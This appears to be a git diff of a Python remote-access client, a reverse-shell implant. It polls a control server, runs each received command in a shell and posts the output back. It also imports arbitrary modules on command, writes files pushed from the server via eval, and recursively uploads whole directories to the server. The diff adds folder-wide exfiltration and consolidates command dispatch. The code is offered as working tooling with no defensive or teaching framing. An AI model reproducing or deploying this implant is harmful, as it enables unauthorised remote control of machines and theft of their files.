@@ -1,92 +1,119 @@
-#!/usr/bin/python3 
+#!/usr/bin/python3
 import requests
 import subprocess
-from os import path,listdir
+from os import path,listdir,getcwd
+from os.path import isdir,isfile
+
 
 class Client():
     def __init__(self,server):
         self.server = server
-        
-    def os(self,command):
-        c=command.split("-")[1]
-        attribute=c.split()[0]
-        AT = c.split()
-        module = __import__("os")
-        try:
-            function = getattr(module, attribute)
-            if len(AT) == 2:
-                argument = AT[1]
-                try:
-                    A = function(argument)
-                    R = requests.post(self.server, A)
-                except Exception as E:
-                    R = requests.post(self.server, (str(E).encode("utf-8")))
-            else:
-                try:
-                    A = function()
-                    R = requests.post(self.server, A)
-                except Exception as E:
-                    R = requests.post(self.server, (str(E).encode("utf-8")))
+    
+    def sender(self,data=None,fileName=None):
+        if fileName:
+            fn=fileName.split("/")[-1]
+            uploadURL=self.server+"/upload"    
+            file={'file': open(fileName,"rb"),'name':fn }
+            requests.post(uploadURL,files=file) 
+        if data:
+            requests.post(self.server,data)
 
-        except Exception as E:
-            R = requests.post(self.server, (str(E).encode("utf-8")))
+    def setModule(self,command=None):
+        newModule="os"
+        if command:
+            newModule=(command.split("import ")[1])
+        self.module = __import__(newModule)
+    
+    def pack(self,command):
+        tmp=command.split("-")[1]
+        attribute=tmp.split()[0]
+        arguments=tmp.split()[1:]
+        function = getattr(self.module, attribute)       
+        if len(arguments)==0:
+            d = function()
+        elif len(arguments) == 1:
+            d = function(arguments[0])     
+        elif len(arguments) == 2:
+            d = function(arguments[0],arguments[1])
+        else:
+            d = "At the moment no support for more than two arguments"
+        self.sender(d)
 
     def process(self,c):
         if c.startswith("cd"):
             dir=c.split("cd ")[1]
-            self.os(f"-chdir {dir}")
+            self.setModule()
+            self.pack(f"-chdir {dir}")
         else:
             P = subprocess.Popen(c, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            OUT = P.stdout.read()
-            ERR = P.stderr.read()
-            if not OUT:
-                R = requests.post(self.server, ERR)
+            out = P.stdout.read()
+            err = P.stderr.read()
+            if not out:
+                self.sender(err)
             else:
-                R = requests.post(self.server, OUT)
+                self.sender(out)
     
-    def fileReciver(self,command):    
-        f=command.split("upload ")[1]
-        dataDict=eval(f)
-        fileName=dataDict['file']
+    def fileReciver(self,command):  
+        dataDict=eval(command.split("upload ")[1])
         fileToSave=dataDict['name']
         data=dataDict['data']
-        try:
-            with open(fileToSave, 'wb') as o:
-                o.write( data )
-        except Exception as e:
-            R = requests.post(self.server,(str(e)).encode('utf-8'))
+        with open(fileToSave, 'wb') as o:
+            o.write( data )
 
-    def sender(self,filename):
-        upload=self.server+"/upload"    
-        file={'file': open(filename,"rb"),'name':filename }
-        requests.post(upload,files=file) 
-
+    def folder(self,folderPath):
+        files=listdir(folderPath)
+        fullPath=[folderPath+"/"+file for file in files ]
+        for file in fullPath:
+            if isdir(file):
+                self.folder(f'{file}')
+            if isfile(file):
+                self.sender(fileName=file)
+            else:
+                self.sender("File Path Error")
+    
     def file(self,command):
         file=command.split("download ")[1]
-        if file.startswith("all"):
-            for file in listdir():
-                self.sender(file)
+        filePath=(getcwd()+"/"+file)
+        if isdir(filePath):
+            self.folder(filePath)
+        elif file.startswith("all"):
+            files=listdir()
+            fullPath=[f"{getcwd()}/{file}" for file in files ]
+            for file in fullPath:
+                if isdir(file):
+                    self.folder(file)
+                else:
+                    self.sender(fileName=file)
         else:
             if path.exists(file):
-                self.sender(file)
+                self.sender(fileName=file)
             else:
-                R = requests.post(self.server,("File missing").encode('utf-8'))
+                self.sender("File Missing")
+
+    def command(self,command):
+        try:
+            if command.startswith("download "):
+                self.file(command)
+            elif command.startswith("upload "):
+                self.fileReciver(command)
+            elif command.startswith("-"):
+                self.pack(command)
+            elif  command.startswith("import"):
+                self.setModule(command)
+            else:
+                self.process(command)
+        except Exception as e:
+            self.sender(str(e))
 
 def main():
+    #server = "http://0.0.0.0"
     server=None
     obj=Client(server)
     while True:
         try:
             RevcivedData = requests.get(server)
             command = RevcivedData.text
-            if command.startswith("download "):
-                obj.file(command)
-            elif command.startswith("upload "):
-                obj.fileReciver(command)
-            elif command.startswith("-"):
-                obj.os(command)
-            else:
-                obj.process(command)
+            obj.command(command)
         except Exception as e:
             pass
 
